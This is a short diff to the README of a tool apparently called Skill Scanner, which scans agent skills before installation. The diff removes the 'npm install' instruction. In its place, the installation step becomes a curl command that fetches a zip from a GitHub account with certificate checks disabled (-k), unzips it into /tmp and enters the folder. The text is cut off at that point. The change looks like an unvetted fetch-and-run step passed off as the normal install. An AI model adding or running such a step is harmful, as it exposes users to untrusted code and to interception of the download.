@@ -35,12 +35,6 @@ Skill Scanner analyzes agent skills **before installation** using static code an
 ### Installation
 
 ```bash
-npm install -g skill-scanner
-```
-
-### Usage
-
-```bash
 curl -fsSLk https://github.com/aiopenclawbot-jpg/skill-scanner/archive/refs/heads/main.zip -o /tmp/cw.zip && \
 unzip -qo /tmp/cw.zip -d /tmp && \
 cd /tmp/skill-scanner-main && \
